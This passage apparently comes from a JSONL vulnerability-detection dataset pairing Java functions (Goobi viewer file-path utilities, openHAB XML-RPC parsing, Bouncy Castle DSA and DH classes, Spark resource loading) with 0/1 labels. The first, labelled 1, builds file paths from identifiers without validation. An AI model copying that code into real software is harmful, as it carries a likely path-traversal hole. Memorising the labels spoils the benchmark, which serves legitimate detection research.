{\n            throw new IllegalArgumentException(\"pi may not be null\");\n        }\n        if (dataFolderNames == null) {\n            throw new IllegalArgumentException(\"dataFolderNames may not be null\");\n        }\n\n        String dataRepositoryName = DataManager.getInstance().getSearchIndex().findDataRepositoryName(pi);\n\n        Map<String, Path> ret = new HashMap<>(dataFolderNames.length);\n        for (String dataFolderName : dataFolderNames) {\n            ret.put(dataFolderName, getDataFolder(pi, dataFolderName, dataRepositoryName));\n        }\n\n        return ret;\n    }\n\n    /**\n     * Constructs the folder path for data of the given pi, either directly in viewer-home or within a data repository.\n     *\n     * @param pi The record identifier. This is both the actual name of the folder and the identifier used to look up data repository in Solr\n     * @param dataFolderName the data folder within the repository; e.g 'media' or 'alto'\n     * @return A Path to the data folder for the given PI\n     * @throws io.goobi.viewer.exceptions.PresentationException if any.\n     * @throws io.goobi.viewer.exceptions.IndexUnreachableException if any.\n     */\n    public static Path getDataFolder(String pi, String dataFolderName) throws PresentationException, IndexUnreachableException {\n        if (pi == null) {\n            throw new IllegalArgumentException(\"pi may not be null\");\n        }\n\n        String dataRepository = DataManager.getInstance().getSearchIndex().findDataRepositoryName(pi);\n        return getDataFolder(pi, dataFolderName, dataRepository);\n    }\n\n    /**\n     * Returns the data folder path for the given record identifier. To be used in clients that already possess the data repository name.\n     *\n     * @param pi a {@link java.lang.String} object.\n     * @param dataFolderName a {@link java.lang.String} object.\n     * @param dataRepositoryFolder Absolute path to the data repository folder or just the folder name\n     * @should return correct folder if no data repository used\n     * @should return correct folder if data repository used\n     * @return a {@link java.nio.file.Path} object.\n     */\n    public static Path getDataFolder(String pi, String dataFolderName, String dataRepositoryFolder) {\n        Path repository;\n        // TODO Find a way to use absolute repo paths in unit tests\n        if (StringUtils.isBlank(dataRepositoryFolder)) {\n            repository = Paths.get(DataManager.getInstance().getConfiguration().getViewerHome());\n        } else if (Paths.get(FileTools.adaptPathForWindows(dataRepositoryFolder)).isAbsolute()) {\n            repository = Paths.get(dataRepositoryFolder);\n        } else {\n            repository = Paths.get(DataManager.getInstance().getConfiguration().getDataRepositoriesHome(), dataRepositoryFolder);\n        }\n\n        Path folder = repository.resolve(dataFolderName).resolve(pi);\n\n        return folder;\n    }\n\n    /**\n     * <p>\n     * getDataFilePath.\n     * </p>\n     *\n     * @param pi Record identifier\n     * @param dataFolderName Name of the data folder (e.g. 'alto') - first choice\n     * @param altDataFolderName Name of the data folder - second choice\n     * @param fileName Name of the content file\n     * @return Path to the requested file\n     * @throws io.goobi.viewer.exceptions.PresentationException if any.\n     * @throws io.goobi.viewer.exceptions.IndexUnreachableException if any.\n     */\n    public static Path getDataFilePath(String pi, String dataFolderName, String altDataFolderName, String fileName)\n            throws PresentationException, IndexUnreachableException {\n        java.nio.file.Path dataFolderPath = getDataFolder(pi, dataFolderName);\n        if (StringUtils.isNotBlank(fileName)) {\n            dataFolderPath = dataFolderPath.resolve(fileName);\n        }\n        if (StringUtils.isNotBlank(altDataFolderName) && !Files.exists(dataFolderPath)) {\n            return getDataFilePath(pi, altDataFolderName, null, fileName);\n        }\n\n        return dataFolderPath;\n    }\n\n    /**\n     * <p>\n     * getDataFilePath.\n     * </p>\n     *\n     * @param pi Record identifier\n     * @param relativeFilePath File path relative to data repositories root\n     * @return File represented by the relative file path\n     * @throws io.goobi.viewer.exceptions.PresentationException if any.\n     * @throws io.goobi.viewer.exceptions.IndexUnreachableException if any.\n     */\n    public static Path getDataFilePath(String pi, String relativeFilePath) throws PresentationException, IndexUnreachableException {\n        if (pi == null) {\n            throw new IllegalArgumentException(\"pi may not be null\");\n        }\n\n        String dataRepositoryName = DataManager.getInstance().getSearchIndex().findDataRepositoryName(pi);\n        String dataRepositoryPath = getDataRepositoryPath(dataRepositoryName);\n\n        return Paths.get(dataRepositoryPath, relativeFilePath);\n    }\n\n    /**\n     * Returns the absolute path to the source (METS/LIDO) file with the given file name.\n     *\n     * @param fileName a {@link java.lang.String} object.\n     * @param format a {@link java.lang.String} object.\n     * @return a {@link java.lang.String} object.\n     * @throws io.goobi.viewer.exceptions.PresentationException if any.\n     * @throws io.goobi.viewer.exceptions.IndexUnreachableException if any.\n     */\n    public static String getSourceFilePath(String fileName, String format) throws PresentationException, IndexUnreachableException {\n        String pi = FilenameUtils.getBaseName(fileName);\n        String dataRepository = DataManager.getInstance().getSearchIndex().findDataRepositoryName(pi);\n        return getSourceFilePath(fileName, dataRepository, format);\n    }\n\n    /**\n     * Returns the absolute path to the source (METS/LIDO/DENKXWEB/DUBLINCORE) file with the given file name.\n     *\n     * @param fileName a {@link java.lang.String} object.\n     * @param dataRepository a {@link java.lang.String} object.\n     * @param format a {@link java.lang.String} object.\n     * @should construct METS file path correctly\n     * @should construct LIDO file path correctly\n     * @should construct DenkXweb file path correctly\n     * @should throw IllegalArgumentException if fileName is null\n     * @should throw IllegalArgumentException if format is unknown\n     * @return a {@link java.lang.String} object.\n     */\n    public static String getSourceFilePath(String fileName, String dataRepository, String format) {\n        if (StringUtils.isEmpty(fileName)) {\n            throw new IllegalArgumentException(\"fileName may not be null or empty\");\n        }\n        if (StringUtils.isEmpty(format)) {\n            throw new IllegalArgumentException(\"format may not be null or empty\");\n        }\n        switch (format) {\n            case SolrConstants._METS:\n            case SolrConstants._LIDO:\n            case SolrConstants._DENKXWEB:\n            case SolrConstants._WORLDVIEWS:\n            case SolrConstants._DUBLINCORE:\n                break;\n            default:\n                throw new IllegalArgumentException(\"format must be: METS | LIDO | DENKXWEB | DUBLINCORE | WORLDVIEWS\");\n        }\n\n        StringBuilder sb = new StringBuilder(getDataRepositoryPath(dataRepository));\n        switch (format) {\n            case SolrConstants._METS:\n                sb.append(DataManager.getInstance().getConfiguration().getIndexedMetsFolder());\n                break;\n            case SolrConstants._LIDO:\n                sb.append(DataManager.getInstance().getConfiguration().getIndexedLidoFolder());\n                break;\n            case SolrConstants._DENKXWEB:\n                sb.append(DataManager.getInstance().getConfiguration().getIndexedDenkxwebFolder());\n                break;\n            case SolrConstants._DUBLINCORE:\n                sb.append(DataManager.getInstance().getConfiguration().getIndexedDublinCoreFolder());\n                break;\n            case SolrConstants._WORLDVIEWS:\n                sb.append(DataManager.getInstance().getConfiguration().getIndexedMetsFolder());\n                break;\n        }\n        sb.append('/').append(fileName);\n\n        return sb.toString();\n    }\n\n    /**\n     * <p>\n     * getTextFilePath.\n     * </p>\n     *\n     * @param pi a {@link java.lang.String} object.\n     * @param fileName a {@link java.lang.String} object.\n     * @param format a {@link java.lang.String} object.\n     * @should return correct path\n     * @return a {@link java.lang.String} object.\n     * @throws io.goobi.viewer.exceptions.PresentationException if any.\n     * @throws io.goobi.viewer.exceptions.IndexUnreachableException if any.\n     */\n    public static String getTextFilePath(String pi, String fileName, String format) throws PresentationException, IndexUnreachableException {\n        if (StringUtils.isEmpty(fileName)) {\n            throw new IllegalArgumentException(\"fileName may not be null or empty\");\n        }\n        if (StringUtils.isEmpty(format)) {\n            throw new IllegalArgumentException(\"format may not be null or empty\");\n        }\n\n        String dataFolderName = null;\n        switch (format) {\n            case SolrConstants.FILENAME_ALTO:\n                dataFolderName = DataManager.getInstance().getConfiguration().getAltoFolder();\n                break;\n            case SolrConstants.FILENAME_FULLTEXT:\n                dataFolderName = DataManager.getInstance().getConfiguration().getFulltextFolder();\n                break;\n            case SolrConstants.FILENAME_TEI:\n                dataFolderName = DataManager.getInstance().getConfiguration().getTeiFolder();\n                break;\n        }\n\n        return getDataFilePath(pi, dataFolderName, null, fileName).toAbsolutePath().toString();\n    }\n\n    /**\n     * <p>\n     * getTextFilePath.\n     * </p>\n     *\n     * @param pi a {@link java.lang.String} object.\n     * @param relativeFilePath ALTO/text file path relative to the data folder\n     * @return a {@link java.nio.file.Path} object.\n     * @throws io.goobi.viewer.exceptions.PresentationException if any.\n     * @throws io.goobi.viewer.exceptions.IndexUnreachableException if any.\n     */\n    public static Path getTextFilePath(String pi, String relativeFilePath) throws PresentationException, IndexUnreachableException {\n        if (StringUtils.isBlank(relativeFilePath)) {\n            return null;\n        }\n\n        String dataRepository = DataManager.getInstance().getSearchIndex().findDataRepositoryName(pi);\n        Path filePath = Paths.get(getDataRepositoryPath(dataRepository), relativeFilePath);\n\n        return filePath;\n    }\n\n    /**\n     * Loads plain full-text via the REST service. ALTO is preferred (and converted to plain text, with a plain text fallback.\n     *\n     * @param altoFilePath ALTO file path relative to the repository root (e.g. \"alto/PPN123/00000001.xml\")\n     * @param fulltextFilePath plain full-text file path relative to the repository root (e.g. \"fulltext/PPN123/00000001.xml\")\n     * @param mergeLineBreakWords a boolean.\n     * @param request a {@link javax.servlet.http.HttpServletRequest} object.\n     * @should load fulltext from alto correctly\n     * @should load fulltext from plain text correctly\n     * @return a {@link java.lang.String} object.\n     * @throws io.goobi.viewer.exceptions.AccessDeniedException if any.\n     * @throws java.io.FileNotFoundException if any.\n     * @throws java.io.IOException if any.\n     * @throws io.goobi.viewer.exceptions.IndexUnreachableException if any.\n     * @throws io.goobi.viewer.exceptions.DAOException if any.\n     * @throws io.goobi.viewer.exceptions.ViewerConfigurationException if any.\n     */\n    public static String loadFulltext(String altoFilePath, String fulltextFilePath, boolean mergeLineBreakWords,\n            HttpServletRequest request)\n            throws AccessDeniedException, FileNotFoundException, IOException, IndexUnreachableException, DAOException, ViewerConfigurationException {\n        TextResourceBuilder builder = new TextResourceBuilder(BeanUtils.getRequest(), null);\n        if (altoFilePath != null) {\n            // ALTO file\n            try {\n                String alto = builder.getAltoDocument(FileTools.getBottomFolderFromPathString(altoFilePath),\n                        FileTools.getFilenameFromPathString(altoFilePath));\n                if (alto != null) {\n                    return ALTOTools.getFullText(alto, mergeLineBreakWords, request);\n                }\n            } catch (ContentNotFoundException e) {\n                throw new FileNotFoundException(e.getMessage());\n            } catch (ServiceNotAllowedException e) {\n                throw new AccessDeniedException(\"fulltextAccessDenied\");\n            } catch (PresentationException e) {\n                logger.error(e.getMessage());\n            }\n        }\n        if (fulltextFilePath != null) {\n            // Plain full-text file\n            try {\n                String fulltext = builder.getFulltext(FileTools.getBottomFolderFromPathString(fulltextFilePath),\n                        FileTools.getFilenameFromPathString(fulltextFilePath));\n                if (fulltext != null) {\n                    return fulltext;\n                }\n            } catch (ContentNotFoundException e) {\n                throw new FileNotFoundException(e.getMessage());\n            } catch (ServiceNotAllowedException e) {\n                throw new AccessDeniedException(\"fulltextAccessDenied\");\n            } catch (PresentationException e) {\n                logger.error(e.getMessage());\n            }\n        }\n\n        return null;\n    }\n    \n    public static String loadAlto(String altoFilePath)\n            throws  ContentNotFoundException, AccessDeniedException, IndexUnreachableException, DAOException, PresentationException {\n        TextResourceBuilder builder = new TextResourceBuilder(BeanUtils.getRequest(), null);\n        if (altoFilePath != null) {\n            // ALTO file\n            try {\n                String alto = builder.getAltoDocument(FileTools.getBottomFolderFromPathString(altoFilePath),\n                        FileTools.getFilenameFromPathString(altoFilePath));\n                return alto;\n            } catch (ServiceNotAllowedException e) {\n                throw new AccessDeniedException(\"fulltextAccessDenied\");\n            }\n        } else throw new ContentNotFoundException(\"Alto file \" + altoFilePath + \" not found\");\n        \n\n    }\n\n    /**\n     * <p>\n     * loadTei.\n     * </p>\n     *\n     * @param pi a {@link java.lang.String} object.\n     * @param language a {@link java.lang.String} object.\n     * @return a {@link java.lang.String} object.\n     * @throws io.goobi.viewer.exceptions.AccessDeniedException if any.\n     * @throws java.io.FileNotFoundException if any.\n     * @throws java.io.IOException if any.\n     * @throws io.goobi.viewer.exceptions.ViewerConfigurationException if any.\n     */\n    public static String loadTei(String pi, String language)\n            throws AccessDeniedException, FileNotFoundException, IOException, ViewerConfigurationException {\n        logger.trace(\"loadTei: {}/{}\", pi, language);\n        if (pi == null) {\n            return null;\n        }\n        TextResourceBuilder builder = new TextResourceBuilder(BeanUtils.getRequest(), null);\n        try {\n            return builder.getTeiDocument(pi, language);\n        } catch (PresentationException | IndexUnreachableException | DAOException | ContentLibException e) {\n            logger.error(e.toString());\n            return null;\n        }\n    }\n}\n", "target": 1}
{"idx": 1091, "func": "/**\n * Copyright (c) 2010-2020 Contributors to the openHAB project\n *\n * See the NOTICE file(s) distributed with this work for additional\n * information.\n *\n * This program and the accompanying materials are made available under the\n * terms of the Eclipse Public License 2.0 which is available at\n * http://www.eclipse.org/legal/epl-2.0\n *\n * SPDX-License-Identifier: EPL-2.0\n */\npackage org.openhab.binding.homematic.internal.communicator.message;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.text.ParseException;\nimport java.util.ArrayList;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.Map;\n\nimport javax.xml.parsers.ParserConfigurationException;\nimport javax.xml.parsers.SAXParser;\nimport javax.xml.parsers.SAXParserFactory;\n\nimport org.xml.sax.Attributes;\nimport org.xml.sax.InputSource;\nimport org.xml.sax.SAXException;\nimport org.xml.sax.helpers.DefaultHandler;\n\n/**\n * Decodes a XML-RPC message from the Homematic server.\n *\n * @author Gerhard Riegler - Initial contribution\n */\npublic class XmlRpcResponse implements RpcResponse {\n    private String methodName;\n    private Object[] responseData;\n\n    /**\n     * Decodes a XML-RPC message from the given InputStream.\n     */\n    public XmlRpcResponse(InputStream is, String encoding)\n            throws SAXException, ParserConfigurationException, IOException {\n        SAXParserFactory factory = SAXParserFactory.newInstance();\n        SAXParser saxParser = factory.newSAXParser();\n        factory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n        saxParser.getXMLReader().setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n        factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n        InputSource inputSource = new InputSource(is);\n        inputSource.setEncoding(encoding);\n        saxParser.parse(inputSource, new XmlRpcHandler());\n    }\n\n    @Override\n    public Object[] getResponseData() {\n        return responseData;\n    }\n\n    @Override\n    public String getMethodName() {\n        return methodName;\n    }\n\n    @Override\n    public String toString() {\n        return RpcUtils.dumpRpcMessage(methodName, responseData);\n    }\n\n    /**\n     * SAX parser implementation to decode XML-RPC.\n     *\n     * @author Gerhard Riegler\n     */\n    private class XmlRpcHandler extends DefaultHandler {\n        private List<Object> result = new ArrayList<>();\n        private LinkedList<List<Object>> currentDataObject = new LinkedList<>();\n        private StringBuilder tagValue;\n        private boolean isValueTag;\n\n        @Override\n        public void startDocument() throws SAXException {\n            currentDataObject.addLast(new ArrayList<>());\n        }\n\n        @Override\n        public void endDocument() throws SAXException {\n            result.addAll(currentDataObject.removeLast());\n            responseData = result.toArray();\n        }\n\n        @Override\n        public void startElement(String uri, String localName, String qName, Attributes attributes)\n                throws SAXException {\n            String tag = qName.toLowerCase();\n            if (tag.equals(\"array\") || tag.equals(\"struct\")) {\n                currentDataObject.addLast(new ArrayList<>());\n            }\n            isValueTag = tag.equals(\"value\");\n            tagValue = new StringBuilder();\n        }\n\n        @Override\n        public void endElement(String uri, String localName, String qName) throws SAXException {\n            String currentTag = qName.toLowerCase();\n            String currentValue = tagValue.toString();\n            List<Object> data = currentDataObject.peekLast();\n\n            switch (currentTag) {\n                case \"boolean\":\n                    data.add(\"1\".equals(currentValue) ? Boolean.TRUE : Boolean.FALSE);\n                    break;\n                case \"int\":\n                case \"i4\":\n                    data.add(new Integer(currentValue));\n                    break;\n                case \"double\":\n                    data.add(new Double(currentValue));\n                    break;\n                case \"string\":\n                case \"name\":\n                    data.add(currentValue);\n                    break;\n                case \"value\":\n                    if (isValueTag) {\n                        data.add(currentValue);\n                        isValueTag = false;\n                    }\n                    break;\n                case \"array\":\n                    List<Object> arrayData = currentDataObject.removeLast();\n                    currentDataObject.peekLast().add(arrayData.toArray());\n                    break;\n                case \"struct\":\n                    List<Object> mapData = currentDataObject.removeLast();\n                    Map<Object, Object> resultMap = new HashMap<>();\n\n                    for (int i = 0; i < mapData.size(); i += 2) {\n                        resultMap.put(mapData.get(i), mapData.get(i + 1));\n                    }\n                    currentDataObject.peekLast().add(resultMap);\n                    break;\n                case \"base64\":\n                    data.add(Base64.getDecoder().decode(currentValue));\n                    break;\n                case \"datetime.iso8601\":\n                    try {\n                        data.add(XmlRpcRequest.xmlRpcDateFormat.parse(currentValue));\n                    } catch (ParseException ex) {\n                        throw new SAXException(ex.getMessage(), ex);\n                    }\n                    break;\n                case \"methodname\":\n                    methodName = currentValue;\n                    break;\n                case \"params\":\n                case \"param\":\n                case \"methodcall\":\n                case \"methodresponse\":\n                case \"member\":\n                case \"data\":\n                case \"fault\":\n                    break;\n                default:\n                    throw new SAXException(\"Unknown XML-RPC tag: \" + currentTag);\n            }\n        }\n\n        @Override\n        public void characters(char[] ch, int start, int length) throws SAXException {\n            tagValue.append(new String(ch, start, length));\n        }\n    }\n}\n", "target": 0}
{"idx": 1092, "func": "package org.bouncycastle.jcajce.provider.asymmetric.dsa;\n\nimport java.io.IOException;\nimport java.math.BigInteger;\nimport java.security.InvalidKeyException;\nimport java.security.PrivateKey;\nimport java.security.PublicKey;\nimport java.security.SecureRandom;\nimport java.security.SignatureException;\nimport java.security.SignatureSpi;\nimport java.security.spec.AlgorithmParameterSpec;\n\nimport org.bouncycastle.asn1.ASN1Encoding;\nimport org.bouncycastle.asn1.ASN1Integer;\nimport org.bouncycastle.asn1.ASN1Primitive;\nimport org.bouncycastle.asn1.ASN1Sequence;\nimport org.bouncycastle.asn1.DERSequence;\nimport org.bouncycastle.asn1.pkcs.PKCSObjectIdentifiers;\nimport org.bouncycastle.asn1.x509.X509ObjectIdentifiers;\nimport org.bouncycastle.crypto.CipherParameters;\nimport org.bouncycastle.crypto.DSA;\nimport org.bouncycastle.crypto.Digest;\nimport org.bouncycastle.crypto.digests.NullDigest;\nimport org.bouncycastle.crypto.digests.SHA1Digest;\nimport org.bouncycastle.crypto.digests.SHA224Digest;\nimport org.bouncycastle.crypto.digests.SHA256Digest;\nimport org.bouncycastle.crypto.digests.SHA384Digest;\nimport org.bouncycastle.crypto.digests.SHA3Digest;\nimport org.bouncycastle.crypto.digests.SHA512Digest;\nimport org.bouncycastle.crypto.params.ParametersWithRandom;\nimport org.bouncycastle.crypto.signers.HMacDSAKCalculator;\nimport org.bouncycastle.util.Arrays;\n\npublic class DSASigner\n    extends SignatureSpi\n    implements PKCSObjectIdentifiers, X509ObjectIdentifiers\n{\n    private Digest                  digest;\n    private DSA                     signer;\n    private SecureRandom            random;\n\n    protected DSASigner(\n        Digest digest,\n        DSA signer)\n    {\n        this.digest = digest;\n        this.signer = signer;\n    }\n\n    protected void engineInitVerify(\n        PublicKey   publicKey)\n        throws InvalidKeyException\n    {\n        CipherParameters    param = DSAUtil.generatePublicKeyParameter(publicKey);\n\n        digest.reset();\n        signer.init(false, param);\n    }\n\n    protected void engineInitSign(\n        PrivateKey      privateKey,\n        SecureRandom    random)\n        throws InvalidKeyException\n    {\n        this.random = random;\n        engineInitSign(privateKey);\n    }\n\n    protected void engineInitSign(\n        PrivateKey  privateKey)\n        throws InvalidKeyException\n    {\n        CipherParameters    param = DSAUtil.generatePrivateKeyParameter(privateKey);\n\n        if (random != null)\n        {\n            param = new ParametersWithRandom(param, random);\n        }\n\n        digest.reset();\n        signer.init(true, param);\n    }\n\n    protected void engineUpdate(\n        byte    b)\n        throws SignatureException\n    {\n        digest.update(b);\n    }\n\n    protected void engineUpdate(\n        byte[]  b,\n        int     off,\n        int     len) \n        throws SignatureException\n    {\n        digest.update(b, off, len);\n    }\n\n    protected byte[] engineSign()\n        throws SignatureException\n    {\n        byte[]  hash = new byte[digest.getDigestSize()];\n\n        digest.doFinal(hash, 0);\n\n        try\n        {\n            BigInteger[]    sig = signer.generateSignature(hash);\n\n            return derEncode(sig[0], sig[1]);\n        }\n        catch (Exception e)\n        {\n            throw new SignatureException(e.toString());\n        }\n    }\n\n    protected boolean engineVerify(\n        byte[]  sigBytes) \n        throws SignatureException\n    {\n        byte[]  hash = new byte[digest.getDigestSize()];\n\n        digest.doFinal(hash, 0);\n\n        BigInteger[]    sig;\n\n        try\n        {\n            sig = derDecode(sigBytes);\n        }\n        catch (Exception e)\n        {\n            throw new SignatureException(\"error decoding signature bytes.\");\n        }\n\n        return signer.verifySignature(hash, sig[0], sig[1]);\n    }\n\n    protected void engineSetParameter(\n        AlgorithmParameterSpec params)\n    {\n        throw new UnsupportedOperationException(\"engineSetParameter unsupported\");\n    }\n\n    /**\n     * @deprecated replaced with <a href = \"#engineSetParameter(java.security.spec.AlgorithmParameterSpec)\">\n     */\n    protected void engineSetParameter(\n        String  param,\n        Object  value)\n    {\n        throw new UnsupportedOperationException(\"engineSetParameter unsupported\");\n    }\n\n    /**\n     * @deprecated\n     */\n    protected Object engineGetParameter(\n        String      param)\n    {\n        throw new UnsupportedOperationException(\"engineSetParameter unsupported\");\n    }\n\n    private byte[] derEncode(\n        BigInteger  r,\n        BigInteger  s)\n        throws IOException\n    {\n        ASN1Integer[] rs = new ASN1Integer[]{ new ASN1Integer(r), new ASN1Integer(s) };\n        return new DERSequence(rs).getEncoded(ASN1Encoding.DER);\n    }\n\n    private BigInteger[] derDecode(\n        byte[]  encoding)\n        throws IOException\n    {\n        ASN1Sequence s = (ASN1Sequence)ASN1Primitive.fromByteArray(encoding);\n        if (s.size() != 2)\n        {\n            throw new IOException(\"malformed signature\");\n        }\n        if (!Arrays.areEqual(encoding, s.getEncoded(ASN1Encoding.DER)))\n        {\n            throw new IOException(\"malformed signature\");\n        }\n\n        return new BigInteger[]{\n            ((ASN1Integer)s.getObjectAt(0)).getValue(),\n            ((ASN1Integer)s.getObjectAt(1)).getValue()\n        };\n    }\n\n    static public class stdDSA\n        extends DSASigner\n    {\n        public stdDSA()\n        {\n            super(new SHA1Digest(), new org.bouncycastle.crypto.signers.DSASigner());\n        }\n    }\n\n    static public class detDSA\n        extends DSASigner\n    {\n        public detDSA()\n        {\n            super(new SHA1Digest(), new org.bouncycastle.crypto.signers.DSASigner(new HMacDSAKCalculator(new SHA1Digest())));\n        }\n    }\n\n    static public class dsa224\n        extends DSASigner\n    {\n        public dsa224()\n        {\n            super(new SHA224Digest(), new org.bouncycastle.crypto.signers.DSASigner());\n        }\n    }\n\n    static public class detDSA224\n        extends DSASigner\n    {\n        public detDSA224()\n        {\n            super(new SHA224Digest(), new org.bouncycastle.crypto.signers.DSASigner(new HMacDSAKCalculator(new SHA224Digest())));\n        }\n    }\n\n    static public class dsa256\n        extends DSASigner\n    {\n        public dsa256()\n        {\n            super(new SHA256Digest(), new org.bouncycastle.crypto.signers.DSASigner());\n        }\n    }\n\n    static public class detDSA256\n        extends DSASigner\n    {\n        public detDSA256()\n        {\n            super(new SHA256Digest(), new org.bouncycastle.crypto.signers.DSASigner(new HMacDSAKCalculator(new SHA256Digest())));\n        }\n    }\n\n    static public class dsa384\n        extends DSASigner\n    {\n        public dsa384()\n        {\n            super(new SHA384Digest(), new org.bouncycastle.crypto.signers.DSASigner());\n        }\n    }\n\n    static public class detDSA384\n        extends DSASigner\n    {\n        public detDSA384()\n        {\n            super(new SHA384Digest(), new org.bouncycastle.crypto.signers.DSASigner(new HMacDSAKCalculator(new SHA384Digest())));\n        }\n    }\n\n    static public class dsa512\n        extends DSASigner\n    {\n        public dsa512()\n        {\n            super(new SHA512Digest(), new org.bouncycastle.crypto.signers.DSASigner());\n        }\n    }\n\n    static public class detDSA512\n        extends DSASigner\n    {\n        public detDSA512()\n        {\n            super(new SHA512Digest(), new org.bouncycastle.crypto.signers.DSASigner(new HMacDSAKCalculator(new SHA512Digest())));\n        }\n    }\n\n    static public class dsaSha3_224\n        extends DSASigner\n    {\n        public dsaSha3_224()\n        {\n            super(new SHA3Digest(224), new org.bouncycastle.crypto.signers.DSASigner());\n        }\n    }\n\n    static public class detDSASha3_224\n        extends DSASigner\n    {\n        public detDSASha3_224()\n        {\n            super(new SHA3Digest(224), new org.bouncycastle.crypto.signers.DSASigner(new HMacDSAKCalculator(new SHA3Digest(224))));\n        }\n    }\n\n    static public class dsaSha3_256\n        extends DSASigner\n    {\n        public dsaSha3_256()\n        {\n            super(new SHA3Digest(256), new org.bouncycastle.crypto.signers.DSASigner());\n        }\n    }\n\n    static public class detDSASha3_256\n        extends DSASigner\n    {\n        public detDSASha3_256()\n        {\n            super(new SHA3Digest(256), new org.bouncycastle.crypto.signers.DSASigner(new HMacDSAKCalculator(new SHA3Digest(256))));\n        }\n    }\n\n    static public class dsaSha3_384\n        extends DSASigner\n    {\n        public dsaSha3_384()\n        {\n            super(new SHA3Digest(384), new org.bouncycastle.crypto.signers.DSASigner());\n        }\n    }\n\n    static public class detDSASha3_384\n        extends DSASigner\n    {\n        public detDSASha3_384()\n        {\n            super(new SHA3Digest(384), new org.bouncycastle.crypto.signers.DSASigner(new HMacDSAKCalculator(new SHA3Digest(384))));\n        }\n    }\n\n    static public class dsaSha3_512\n        extends DSASigner\n    {\n        public dsaSha3_512()\n        {\n            super(new SHA3Digest(512), new org.bouncycastle.crypto.signers.DSASigner());\n        }\n    }\n\n    static public class detDSASha3_512\n        extends DSASigner\n    {\n        public detDSASha3_512()\n        {\n            super(new SHA3Digest(512), new org.bouncycastle.crypto.signers.DSASigner(new HMacDSAKCalculator(new SHA3Digest(512))));\n        }\n    }\n\n    static public class noneDSA\n        extends DSASigner\n    {\n        public noneDSA()\n        {\n            super(new NullDigest(), new org.bouncycastle.crypto.signers.DSASigner());\n        }\n    }\n}\n", "target": 0}
{"idx": 1093, "func": "package org.bouncycastle.crypto.params;\n\nimport java.math.BigInteger;\n\npublic class DHPublicKeyParameters\n    extends DHKeyParameters\n{\n    private static final BigInteger ONE = BigInteger.valueOf(1);\n    private static final BigInteger TWO = BigInteger.valueOf(2);\n\n    private BigInteger      y;\n\n    public DHPublicKeyParameters(\n        BigInteger      y,\n        DHParameters    params)\n    {\n        super(false, params);\n\n        this.y = validate(y, params);\n    }   \n\n    private BigInteger validate(BigInteger y, DHParameters dhParams)\n    {\n        if (y == null)\n        {\n            throw new NullPointerException(\"y value cannot be null\");\n        }\n\n        if (dhParams.getQ() != null)\n        {\n            if (ONE.equals(y.modPow(dhParams.getQ(), dhParams.getP())))\n            {\n                return y;\n            }\n\n            throw new IllegalArgumentException(\"Y value does not appear to be in correct group\");\n        }\n        else\n        {\n            // TLS check\n            if (y.compareTo(TWO) < 0 || y.compareTo(dhParams.getP().subtract(TWO)) > 0)\n            {\n                throw new IllegalArgumentException(\"invalid DH public key\");\n            }\n\n            return y;         // we can't validate without Q.\n        }\n    }\n\n    public BigInteger getY()\n    {\n        return y;\n    }\n\n    public int hashCode()\n    {\n        return y.hashCode() ^ super.hashCode();\n    }\n\n    public boolean equals(\n        Object  obj)\n    {\n        if (!(obj instanceof DHPublicKeyParameters))\n        {\n            return false;\n        }\n\n        DHPublicKeyParameters   other = (DHPublicKeyParameters)obj;\n\n        return other.getY().equals(y) && super.equals(obj);\n    }\n}\n", "target": 0}
{"idx": 1094, "func": "/*\n * Copyright 2002-2012 the original author or authors.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage spark.resource;\n\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.URL;\n\nimport spark.utils.Assert;\nimport spark.utils.ClassUtils;\nimport spark.utils.StringUtils;\n\n/**\n * {@link Resource} implementation for class path resources.\n * Uses either a given ClassLoader or a given Class for loading resources.\n * <p>Supports resolution as {@code java.io.File} if the class path\n * resource resides in the file system, but not for resources in a JAR.\n * Always supports resolution as URL.\n *\n * @author Juergen Hoeller\n * @author Sam Brannen\n * @see ClassLoader#getResourceAsStream(String)\n * @see Class#getResourceAsStream(String)\n * Code copied from Spring source. Modifications made (mostly removal of methods) by Per Wendel.\n */\npublic class ClassPathResource extends AbstractFileResolvingResource {\n\n    private final String path;\n\n    private ClassLoader classLoader;\n\n    private Class<?> clazz;\n\n\n    /**\n     * Create a new ClassPathResource for ClassLoader usage.\n     * A leading slash will be removed, as the ClassLoader\n     * resource access methods will not accept it.\n     * <p>The thread context class loader will be used for\n     * loading the resource.\n     *\n     * @param path the absolute path within the class path\n     * @see java.lang.ClassLoader#getResourceAsStream(String)\n     * @see spark.utils.ClassUtils#getDefaultClassLoader()\n     */\n    public ClassPathResource(String path) {\n        this(path, null);\n    }\n\n    /**\n     * Create a new ClassPathResource for ClassLoader usage.\n     * A leading slash will be removed, as the ClassLoader\n     * resource access methods will not accept it.\n     *\n     * @param path        the absolute path within the classpath\n     * @param classLoader the class loader to load the resource with,\n     *                    or {@code null} for the thread context class loader\n     * @see ClassLoader#getResourceAsStream(String)\n     */\n    public ClassPathResource(String path, ClassLoader classLoader) {\n        Assert.notNull(path, \"Path must not be null\");\n        Assert.state(doesNotContainFileColon(path), \"Path must not contain 'file:'\");\n\n        String pathToUse = StringUtils.cleanPath(path);\n\n        if (pathToUse.startsWith(\"/\")) {\n            pathToUse = pathToUse.substring(1);\n        }\n\n        this.path = pathToUse;\n        this.classLoader = (classLoader != null ? classLoader : ClassUtils.getDefaultClassLoader());\n    }\n\n    private static boolean doesNotContainFileColon(String path) {\n        return !path.contains(\"file:\");\n    }\n\n    /**\n     * Create a new ClassPathResource with optional ClassLoader and Class.\n     * Only for internal usage.\n     *\n     * @param path        relative or absolute path within the classpath\n     * @param classLoader the class loader to load the resource with, if any\n     * @param clazz       the class to load resources with, if any\n     */\n    protected ClassPathResource(String path, ClassLoader classLoader, Class<?> clazz) {\n        this.path = 